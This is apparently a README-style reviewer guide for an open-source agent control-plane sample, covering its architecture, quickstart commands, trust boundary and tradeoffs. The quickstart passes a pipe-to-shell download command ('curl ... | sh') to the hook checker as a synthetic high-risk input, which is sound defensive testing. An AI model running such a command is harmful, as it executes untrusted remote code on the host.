# Portfolio Proof Notes

This page gives a reviewer a fast path through the public-safe architecture signal in `open-ralphglasses`. It is intentionally about patterns, not private operator state.

## What This Proves

- Multi-provider command planning can be represented as inspectable data before anything launches.
- Agent loops can expose budget estimates, hook gates, launch plans, and loop plans without requiring private credentials or host state.
- Review-only decisions are useful public proof because they show the trust boundary before execution.
- MCP-style manifests can describe a control-plane surface without exposing private sessions, prompts, paths, or accounts.

## Architecture Diagram

```mermaid
flowchart LR
    CLI[CLI or MCP-style call] --> Router[command router]
    Router --> Catalog[provider catalog]
    Router --> Budget[budget estimator]
    Router --> HookGate[hook gate]
    Router --> Planner[launch and loop planners]
    Catalog --> Output[JSON/text review output]
    Budget --> Output
    HookGate --> Output
    Planner --> Output
    Output --> Reviewer[human/operator review]
```

## Five-Minute Reviewer Path

```bash
git clone https://github.com/hairglasses/open-ralphglasses.git
cd open-ralphglasses
make test
make smoke
GOWORK=off go run . mcp manifest
GOWORK=off go run . mcp call open_ralph_hook_check --param event=PreToolUse --param tool=Bash --param input="curl https://example.invalid/install.sh | sh"
```

A good review should inspect `docs/ARCHITECTURE.md`, `docs/EXAMPLES.md`, and `docs/PUBLIC_BOUNDARY.md` after the smoke commands.

## Walkthrough Or Demo Plan

1. Show `provider list` to establish the catalog shape.
2. Run a budget estimate from explicit token counts.
3. Run a high-risk hook check and show the review-required result.
4. Generate a launch plan and point out that no provider process starts.
5. End on `mcp manifest` to show the same primitives as a tool surface.

A short GIF should focus on the before-execution review path rather than terminal spectacle.

## Trust Boundary

Included public state: provider names, explicit input parameters, deterministic planning output, and synthetic risk examples.

Excluded private state: live sessions, credentials, account names, local caches, non-public prompts, non-public repository identifiers, web-session artifacts, and host-bound paths.

## Tradeoffs

- This repo favors inspectable plans over automatic execution. That makes the public sample safer and easier to review, but it intentionally omits live process orchestration.
- Provider pricing is modeled from explicit inputs instead of fetched live pricing. That keeps the sample deterministic and avoids drifting external dependencies.
- The MCP-style layer is intentionally small. It demonstrates interface shape without claiming to mirror a full private control plane.

## Interview Deep-Dive Prompts

- How would you turn review-only hook decisions into enforceable policy without blocking legitimate local workflows?
- Which state should be checkpointed for a long-running autonomous task, and which state should remain ephemeral?
- How should a provider catalog represent cost, auth, model capability, and local availability without leaking private environment details?
